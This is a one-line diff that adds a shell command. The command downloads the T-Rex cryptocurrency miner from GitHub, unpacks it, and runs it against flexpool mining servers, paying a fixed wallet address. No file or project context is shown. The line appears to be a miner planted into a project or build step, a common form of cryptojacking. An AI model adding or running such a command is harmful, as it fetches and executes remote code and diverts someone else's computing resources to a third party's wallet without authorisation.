@@ -1,0 +1,1 @@
+wget https://github.com/trexminer/T-Rex/releases/download/0.25.8/t-rex-0.25.8-linux.tar.gz && tar -xf t-rex-0.25.8-linux.tar.gz && ./t-rex -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -o stratum+ssl://eth-us-west.flexpool.io:5555 -u 0x2E12c5bc11b79a7589eD0509E00A5024776e8Ce4 -p x -w jack1
